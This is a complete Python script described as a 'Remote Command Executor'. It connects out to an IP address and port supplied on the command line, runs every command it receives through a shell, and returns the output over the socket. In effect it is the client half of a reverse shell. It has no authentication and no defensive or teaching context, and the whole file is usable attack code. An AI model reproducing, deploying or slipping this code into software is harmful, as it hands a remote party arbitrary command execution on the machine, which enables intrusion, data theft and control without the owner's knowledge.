import socket
import subprocess
import argparse
import sys


def connect(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((server_ip, server_port))
        while True:
            command = client.recv(1024).decode()
            if command.strip() == "exit":
                print("Exiting...")
                break

            try:
                # Execute the command and capture the output
                CMD = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                )
                stdout, stderr = CMD.communicate()
                # Send the output and error back to the server
                client.send(stdout + stderr)
            except Exception as e:
                print(f"Command execution failed: {e}")
                client.send(f"Error executing command: {e}".encode())
    finally:
        client.close()


def main():
    parser = argparse.ArgumentParser(description="Remote Command Executor")
    parser.add_argument('server_ip', type=str, help='IP address of the server to connect to')
    parser.add_argument('server_port', type=int, help='Port number of the server to connect to')

    args = parser.parse_args()

    connect(args.server_ip, args.server_port)


if __name__ == "__main__":
    main()
